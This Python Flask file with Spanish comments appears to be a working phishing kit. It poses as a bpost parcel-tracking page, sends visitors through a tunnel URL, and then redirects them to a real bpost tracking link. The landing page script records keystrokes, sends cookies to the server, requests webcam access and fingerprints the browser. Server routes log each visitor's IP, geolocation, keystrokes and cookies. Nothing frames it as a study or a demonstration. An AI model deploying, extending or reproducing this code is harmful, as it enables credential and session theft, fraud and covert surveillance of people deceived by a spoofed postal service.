import logging
import requests
from flask import Flask, request, redirect, render_template_string

# Configuración del logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

app = Flask(__name__)

# URLs
REDIRECT_URL = "https://track.bpost.be/btr/web/#/home?itemCodes=CE539544965BE"
SERVING_URL = "https://tunel-bpost.serveousercontent.com"

# HTML de la página de aviso
AVISO_HTML = """
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Seguimiento de Paquete - bpost</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            margin-top: 50px;
            background-color: #f0f2f5;
            color: #333;
        }
        .container {
            background-color: #fff;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
            display: inline-block;
        }
        h1 {
            color: #e44d26;
        }
        p {
            font-size: 1.1em;
        }
        button {
            background-color: #e44d26;
            color: white;
            border: none;
            padding: 12px 24px;
            font-size: 16px;
            border-radius: 6px;
            cursor: pointer;
            margin-top: 20px;
        }
        button:hover {
            background-color: #d33e15;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Seguimiento de Paquete - bpost</h1>
        <p>Actualmente no puede ver el paquete. Por favor, haga clic en el botón para continuar.</p>
        <button onclick="window.location.href='{{ redirect_url }}'">Continuar</button>
    </div>
</body>
</html>
"""

# HTML de la página de aterrizaje
LANDING_PAGE_HTML = """
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Seguimiento de Paquete - bpost</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            margin-top: 50px;
            background-color: #f0f2f5;
            color: #333;
        }
        .container {
            background-color: #fff;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
            display: inline-block;
        }
        h1 {
            color: #e44d26;
        }
        p {
            font-size: 1.1em;
        }
        .spinner {
            border: 4px solid rgba(0, 0, 0, 0.1);
            border-left-color: #e44d26;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
            margin: 25px auto;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Seguimiento de Paquete - bpost</h1>
        <p>Actualizando información de seguimiento...</p>
        <p>Por favor, espere mientras cargamos la información más reciente de su paquete.</p>
        <p>Si la redirección no se completa, haga clic aquí.</p>
        <div class="spinner"></div>
    </div>

    <script>
        // Captura de teclado
        document.addEventListener('keydown', function(event) {
            const key = event.key;
            fetch('/key', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ key: key })
            });
        });

        // Captura de cookies
        document.cookie.split(';').forEach(cookie => {
            const [name, value] = cookie.trim().split('=');
            fetch('/cookie', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ name: name, value: value })
            });
        });

        // Captura de WebRTC
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();
            });

        // Captura de datos del navegador
        async function sendMoreData() {
            const data = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                cookieEnabled: navigator.cookieEnabled,
                screenWidth: screen.width,
                screenHeight: screen.height,
                colorDepth: screen.colorDepth,
                timezoneOffset: new Date().getTimezoneOffset(),
                plugins: Array.from(navigator.plugins).map(p => p.name).join(', ')
            };

            try {
                const response = await fetch('/data', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                });
                const result = await response.json();
                console.log('Datos de navegador enviados:', result);
            } catch (error) {
                console.error('Error al enviar datos del navegador:', error);
            }
        }

        sendMoreData().then(() => {
            setTimeout(() => {
                window.location.href = "{{ redirect_url }}";
            }, 3000);
        });
    </script>
</body>
</html>
"""

def get_ip_geolocation(ip_address):
    """Obtiene información de geolocalización de una IP usando ipinfo.io."""
    try:
        response = requests.get(f"https://ipinfo.io/{ip_address}/json")
        response.raise_for_status()
        return response.json()
    except requests.exceptions.RequestException as e:
        logger.error(f"Error al obtener geolocalización para {ip_address}: {e}")
        return {"error": str(e)}

@app.route('/')
def index():
    user_ip = request.remote_addr
    user_agent = request.headers.get('User-Agent')
    referer = request.headers.get('Referer', 'N/A')
    accept_language = request.headers.get('Accept-Language', 'N/A')

    logger.info(f"Conexión entrante desde: {user_ip}")
    logger.info(f"User-Agent: {user_agent}")
    logger.info(f"Referer: {referer}")
    logger.info(f"Accept-Language: {accept_language}")

    geo_data = get_ip_geolocation(user_ip)
    if geo_data and "error" not in geo_data:
        logger.info(f"Geolocalización para {user_ip}: País={geo_data.get('country')}, Ciudad={geo_data.get('city')}, ISP={geo_data.get('org')}")

    return render_template_string(AVISO_HTML, redirect_url=SERVING_URL)

@app.route('/data', methods=['POST'])
def receive_browser_data():
    try:
        browser_data = request.json
        user_ip = request.remote_addr
        logger.info(f"Datos de navegador recibidos de {user_ip}:")
        for key, value in browser_data.items():
            logger.info(f"  {key}: {value}")
        return {"status": "success", "message": "Datos recibidos"}
    except Exception as e:
        logger.error(f"Error al recibir datos del navegador: {e}")
        return {"status": "error", "message": str(e)}, 400

@app.route('/key', methods=['POST'])
def receive_key():
    try:
        key = request.json.get('key', 'N/A')
        logger.info(f"Tecla capturada: {key}")
        return {"status": "success", "message": "Tecla recibida"}
    except Exception as e:
        logger.error(f"Error al recibir tecla: {e}")
        return {"status": "error", "message": str(e)}, 400

@app.route('/cookie', methods=['POST'])
def receive_cookie():
    try:
        cookie = request.json
        logger.info(f"Cookie capturada: {cookie}")
        return {"status": "success", "message": "Cookie recibida"}
    except Exception as e:
        logger.error(f"Error al recibir cookie: {e}")
        return {"status": "error", "message": str(e)}, 400

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80, debug=False)